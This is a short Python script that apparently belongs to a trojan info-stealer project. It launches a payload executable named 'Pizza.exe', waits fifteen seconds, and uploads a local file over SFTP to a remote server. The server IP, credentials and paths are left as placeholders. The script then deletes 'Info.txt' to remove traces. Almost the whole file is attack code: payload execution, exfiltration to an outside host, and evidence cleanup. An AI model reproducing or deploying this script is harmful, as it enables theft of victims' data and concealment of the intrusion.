import os
import time
import paramiko


os.system("E:/Github_Projects/Trojan_Info_Stealer/Pizza.exe") #Running the payload 
time.sleep(15)

#Sending files to remote server

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('Server IP', username='', password='')

# print ("connected successfully!")

sftp = ssh.open_sftp()
sftp.put("Local_Path", "Remote_Path")
sftp.close()
ssh.close()

os.remove('Info.txt')
